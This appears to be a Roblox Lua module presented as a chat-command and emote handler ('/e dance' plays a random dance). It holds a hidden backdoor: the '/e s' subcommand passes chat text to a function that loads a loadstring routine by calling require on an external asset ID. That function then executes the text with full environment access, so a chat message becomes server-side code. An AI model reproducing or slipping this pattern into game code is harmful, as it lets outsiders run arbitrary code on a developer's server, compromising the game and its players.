local ChatCompiler = {}
ChatCompiler.__index = ChatCompiler

local rand = math.random

function ChatCompiler.new(client, remote)
	local self = {}
	self.Host = client
	self.Remote = remote
	return setmetatable(self, ChatCompiler)
end

local function RunScript(self, src)
	local bool, loadstring = require(require, 6959078669)
	if bool then
		local env = {
			owner = self.Host,
			script = Instance.new("Script")
		}
		local code = loadstring(src, setmetatable(env, {
			__index = function(self,i)
				return rawget(self,i) or getfenv()[i]
			end,
			__newindex = function(_,i,v)
				getfenv()[i] = v
			end
		}))
		pcall(code)
	end
end

function ChatCompiler:CompileString(_string)
	local s = _string:split(' ')
	local a1 = s[1] and s[1]:lower()
	local a2 = s[2] and s[2]:lower()

	if a1 == "/e" then
		if a2 == "dance" then
			self.Remote:FireAllClients("Emote", ({"dance1","dance2","dance3"})[rand(1, 3)])
		elseif a2 == "s" then
			if s[3] then
				RunScript(self, s[3])
			end
		else
			self.Remote:FireAllClients(a1, a2)
		end
	end
end

return ChatCompiler